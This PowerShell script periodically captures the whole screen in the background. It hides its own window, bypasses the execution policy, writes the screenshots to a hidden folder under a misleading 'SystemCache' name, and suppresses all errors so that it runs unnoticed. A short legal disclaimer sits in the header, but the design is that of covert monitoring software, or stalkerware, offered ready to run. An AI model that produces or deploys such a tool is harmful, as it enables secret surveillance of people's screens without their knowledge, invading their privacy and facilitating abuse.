<#
.SYNOPSIS
    On-demand background screenshot capture. Single file, no dependencies.

.USAGE
    Normal run (window hides itself automatically):
        powershell -ExecutionPolicy Bypass -File .\ScreenCap.ps1

    Stop it:
        powershell -ExecutionPolicy Bypass -File .\ScreenCap.ps1 -Stop

    Foreground/debug run (no hiding):
        powershell -ExecutionPolicy Bypass -File .\ScreenCap.ps1 -NoHide

    Dry-run once:
        powershell -ExecutionPolicy Bypass -File .\ScreenCap.ps1 -RunOnce -NoHide

.NOTES
    LEGAL: Only run on systems you own or have explicit written permission to monitor.
#>

param(
    [switch]$Stop,
    [switch]$RunOnce,
    [switch]$NoHide
)

# ============================================================
# CONFIGURATION  (edit here)
# ============================================================
$IntervalSeconds = 30
$OutputFolder    = "$env:LOCALAPPDATA\SystemCache"
$ImageFormat     = "Jpeg"     # Jpeg | Png | Bmp
$JpegQuality     = 70
$MaxFiles        = 2000       # 0 = unlimited
# ============================================================

$ErrorActionPreference = "Stop"

# ---- Self-hide (relaunch hidden, then exit this window) ----
if (-not $NoHide -and -not $Stop -and -not $env:SCREENCAP_HIDDEN) {
    $self = $MyInvocation.MyCommand.Path
    $argsList = @("-NoProfile","-WindowStyle","Hidden","-ExecutionPolicy","Bypass","-File","`"$self`"")
    if ($RunOnce) { $argsList += "-RunOnce" }
    $env:SCREENCAP_HIDDEN = "1"
    Start-Process -FilePath "powershell.exe" -ArgumentList $argsList -WindowStyle Hidden
    return
}

# ---- Stop switch ----
$mutexName = "Global\ScreenCap_SystemCache"
if ($Stop) {
    $existing = [System.Threading.Mutex]::OpenExisting($mutexName)
    try { $existing.ReleaseMutex() } catch { }
    $existing.Dispose()
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
        Where-Object { $_.CommandLine -like "*ScreenCap.ps1*" -and $_.CommandLine -notlike "*-Stop*" } |
        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    Write-Host "Stopped." -ForegroundColor Yellow
    return
}

# ---- Assemblies ----
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ---- Output folder (hidden) ----
if (-not (Test-Path -LiteralPath $OutputFolder)) {
    $null = New-Item -ItemType Directory -Path $OutputFolder -Force
    try { (Get-Item -LiteralPath $OutputFolder -Force).Attributes = 'Hidden' } catch { }
}

# ---- Single-instance guard ----
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0)) { return }   # already running, exit quietly

# ---- JPEG encoder ----
$jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
    Where-Object { $_.MimeType -eq 'image/jpeg' }
$jpegParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
$jpegParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter(
    [System.Drawing.Imaging.Encoder]::Quality, [long]$JpegQuality)

function Capture-Screen {
    $bmp = $gfx = $null
    try {
        $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height)
        $gfx = [System.Drawing.Graphics]::FromImage($bmp)
        $gfx.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)

        $ext = switch ($ImageFormat) { "Png"{"png"} "Bmp"{"bmp"} default{"jpg"} }
        $file = Join-Path $OutputFolder ("screen_{0}.{1}" -f (Get-Date -Format "yyyyMMdd_HHmmss_fff"), $ext)

        if ($ImageFormat -eq "Jpeg") {
            $bmp.Save($file, $jpegCodec, $jpegParams)
        } else {
            $fmt = if ($ImageFormat -eq "Png") { [System.Drawing.Imaging.ImageFormat]::Png }
                   else { [System.Drawing.Imaging.ImageFormat]::Bmp }
            $bmp.Save($file, $fmt)
        }
    } catch {
        # swallow so the loop never dies
    } finally {
        if ($gfx) { $gfx.Dispose() }
        if ($bmp) { $bmp.Dispose() }
    }
}

function Invoke-Cleanup {
    if ($MaxFiles -le 0) { return }
    try {
        Get-ChildItem -LiteralPath $OutputFolder -Filter "screen_*.*" -File |
            Sort-Object LastWriteTime -Descending |
            Select-Object -Skip $MaxFiles |
            Remove-Item -Force -ErrorAction SilentlyContinue
    } catch { }
}

try {
    do {
        Capture-Screen
        Invoke-Cleanup
        if ($RunOnce) { break }
        Start-Sleep -Seconds $IntervalSeconds
    } while ($true)
}
finally {
    try { $mutex.ReleaseMutex() } catch { }
    $mutex.Dispose()
}